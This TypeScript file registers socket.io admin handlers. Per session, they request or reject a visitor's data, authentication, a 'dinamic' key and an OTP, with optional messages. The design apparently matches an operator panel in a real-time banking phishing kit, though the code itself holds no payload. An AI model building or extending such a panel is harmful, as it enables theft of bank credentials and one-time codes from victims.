import { Socket } from "socket.io";
import { AdminRejectAuth } from "../../../../core/application/usecases/AdminRejectAuth.js";
import { AdminRequestDinamic } from "../../../../core/application/usecases/AdminRequestDinamic.js";
import { AdminRejectDinamic } from "../../../../core/application/usecases/AdminRejectDinamic.js";
import { AdminRequestOtp } from "../../../../core/application/usecases/AdminRequestOtp.js";
import { AdminRejectOtp } from "../../../../core/application/usecases/AdminRejectOtp.js";
import type { AdminRejectData } from "../../../../core/application/usecases/AdminRejectData.js";
import type { AdminRequestData } from "../../../../core/application/usecases/AdminRequestData.js";
import type { AdminRequestAuth } from "../../../../core/application/usecases/AdminRequestAuth.js";
import type { AdminRequestFinish } from "../../../../core/application/usecases/AdminRequestFinish.js";

export function registerAdminHandlers(
  socket: Socket,
  deps: {
    rejectData: AdminRejectData;
    requestData: AdminRequestData;
    requestAuth: AdminRequestAuth;
    rejectAuth: AdminRejectAuth;
    requestDinamic: AdminRequestDinamic;
    rejectDinamic: AdminRejectDinamic;
    requestOtp: AdminRequestOtp;
    rejectOtp: AdminRejectOtp;
    requestFinish: AdminRequestFinish
  }
) {

  socket.on("admin:reject_data", async (payload) => {
  await deps.rejectData.execute({ sessionId: payload?.sessionId, message: payload?.message });
});


  socket.on("admin:reject_auth", async (payload: any) => {
    const sessionId = payload?.sessionId;
    if (typeof sessionId !== "string" || !sessionId.trim()) return;

    await deps.rejectAuth.execute({
      sessionId,
      message: payload?.message,
    });
  });


  socket.on("admin:request_data", async (payload) => {
    await deps.requestData.execute({ sessionId: payload?.sessionId });
  });

  socket.on("admin:request_auth", async (payload: any) => {
    const sessionId = payload?.sessionId;
    if (typeof sessionId !== "string" || !sessionId.trim()) return;

    await deps.requestAuth.execute({
      sessionId,
    });
  });


  socket.on("admin:request_dinamic", async (payload: any) => {
    const sessionId = payload?.sessionId;
    if (typeof sessionId !== "string" || !sessionId.trim()) return;

    await deps.requestDinamic.execute({
      sessionId,
    });
  });

  socket.on("admin:reject_dinamic", async (payload: any) => {
    const sessionId = payload?.sessionId;
    if (typeof sessionId !== "string" || !sessionId.trim()) return;

    await deps.rejectDinamic.execute({
      sessionId,
      message: payload?.message,
    });
  });

  socket.on("admin:request_otp", async (payload: any) => {
    const sessionId = payload?.sessionId;
    if (typeof sessionId !== "string" || !sessionId.trim()) return;

    await deps.requestOtp.execute({
      sessionId,
    });
  });

  socket.on("admin:reject_otp", async (payload: any) => {
    const sessionId = payload?.sessionId;
    if (typeof sessionId !== "string" || !sessionId.trim()) return;

    await deps.rejectOtp.execute({
      sessionId,
      message: payload?.message,
    });
  });

  socket.on("admin:request_finish", async (payload: any) => {
    const sessionId = payload?.sessionId;
    if (typeof sessionId !== "string" || !sessionId.trim()) return;

    await deps.requestFinish.execute({
      sessionId,
    });
  });
}
